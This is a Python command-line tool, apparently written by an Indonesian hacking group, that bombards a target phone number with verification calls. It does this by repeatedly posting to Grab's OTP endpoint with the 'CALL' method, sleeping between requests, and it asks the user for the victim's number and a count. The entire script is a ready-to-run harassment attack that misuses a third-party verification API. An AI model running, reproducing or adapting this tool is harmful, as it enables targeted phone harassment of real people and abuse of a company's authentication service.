#!/usr/bin/python

#import module
import time
import sys
import os
import requests
import random

#ups ada yang mengawasi

#############################################################
"""
           Mungkin saya tidak mengawasi kalian
Tapi yang maha kuasa maha melihat dan tidak pernah tidur
"""

"""
Hargai Pembuat Tools dengan Cara Tidak Record
Tools yang Sudah Orang Lain Buat.

    [+] Hargai Jika Ingin Di hargai [-]
        Izin Jika Ingin Record Tools

Author : 404rgr
Team   : Rao Cyber Team
Email  : 404rgr@gmail.com
IG     : pausi404
Teleg..: 404rgr
Youtube: Pausi Channel
Blog   : https://404rgr.zone.id
Github : https://github.com/404rgr
No Wa  : 0895320325423
Teleg  : https://t.me/404rgr
"""
#Sekian Bacot Dari saya wasalamualaikum wr.wb

#############################################################


#Start.
#Warna
lr=('\033[91m')
lg=('\033[92m')
y=('\033[93m')
lb=('\033[94m')
cy=('\033[36m')
x=('\033[0m')

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.01)

#Banner
bann="""
\033[92m  _  _  _  _  _  _  _
\033[92m / \/ \/ \/ \/ \/ \/ \ 
\033[92m( \033[36mS  P  A  M  M  E  R \033[92m)   \033[1;31m[ \033[94mSpammer Call \033[1;31m]
\033[92m \_/\_/\_/\_/\_/\_/\_/ \033[36m Author \033[1;31m: \033[93m404rgr
\033[92m / \   / \   / \   / \  \033[36mVersion\033[1;31m: \033[93m1.0 {Unfaedah}
\033[92m( \033[36mC\033[92m ) ( \033[36mA \033[92m) (\033[36m L\033[92m ) ( \033[36mL\033[92m )\033[36m Team  \033[1;31m : \033[93mRao Cyber Team
\033[92m \_/   \_/   \_/   \_/
"""
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
#clear
os.system("clear")
#banner
print (bann)
mengetik(r+" !"+lb+" Masukan Nomor dengan '62' {ex: 6289532xxxx}")
#input
koo = input(y+"["+r+"#"+y+"] No Hp Target @=> "+lg)
total=int(input(r+"%s[×] Jumlah $=> %s"%(g,w)))
time.sleep(1)
print (y+" {Tekan Ctrl + C untuk keluar dari program} "+r)
time.sleep(1)
met={'method':'CALL','countryCode':'id','phoneNumber':koo,'templateID':'pax_android_production'}
#loading ####
def updt(total, progress):
    barLength, status = 20, ""
    progress = float(progress) / float(total)
    if progress >= 1.:
        progress, status = 1, "\r\n"
    block = int(round(barLength * progress))
    text = "\rLoading. [ {} ] {:.0f}% {}".format(
        "#" * block + "-" * (barLength - block), round(progress * 100, 0),
        status)
    sys.stdout.write(text)
    sys.stdout.flush()


runs = 100
for run_num in range(runs):
    time.sleep(.001)
    updt(runs, run_num + 1)


try:
        os.system('clear')
        print (bann)
        time.sleep(0.1)
        time.sleep(0.1)
        print (y+" <"+r+"+"+y+">"+lg+" No Target ="+r+">",koo)
        time.sleep(0.1)
        print (y+" <"+r+"-"+y+">"+lg+" Jumlah Yang Akan Di Kirim ="+r+">",total)
        time.sleep(3)
        print()
        print(r+"[>_ ]"+lg+" Start")
        count = 0
        while (count < total):
           idk=("challengeID")
           MEM = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=met)
           if str(idk) in str(MEM.text):
                print("[+] BERHASIL TERKIRIM [+]")
           else:
                   print("[-] GAGAL MENGIRIM [-]")
           time.sleep(37)
except KeyboardInterrupt:
        print()
        print(y+"Good By Wahai Manuksia :(")
        print(r+"Aku Sayang Kamu")
        time.sleep(3)
        print(cy+"Haha Gila")
        time.sleep(2)
        print(y+"Lah Emang Iya :v")
        time.sleep(1)
        print(r+"bye :')")
        exit()
